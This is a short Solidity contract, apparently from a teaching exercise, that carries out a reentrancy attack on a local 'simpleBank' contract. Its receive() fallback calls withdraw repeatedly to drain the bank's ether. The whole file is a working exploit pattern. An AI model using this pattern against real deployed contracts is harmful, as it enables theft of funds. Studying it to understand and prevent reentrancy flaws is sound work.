// License 
// SPDX-License-Identifier: MIT

// Solidity compiler version
pragma solidity 0.8.24;

// Libraries
import "./simpleBank.sol";

// Contract
contract reentrancyAttack {

    simpleBank SimpleBank;

    // Constructor
    constructor (address _simpleBankAddress){
        SimpleBank = simpleBank(_simpleBankAddress);
    }

    function attack() external payable {
        SimpleBank.deposit{value: msg.value}();
        SimpleBank.withdraw();
    }

    receive() external payable {
        if(address(SimpleBank).balance >= 1 ether){
            SimpleBank.withdraw();
        }
    }

}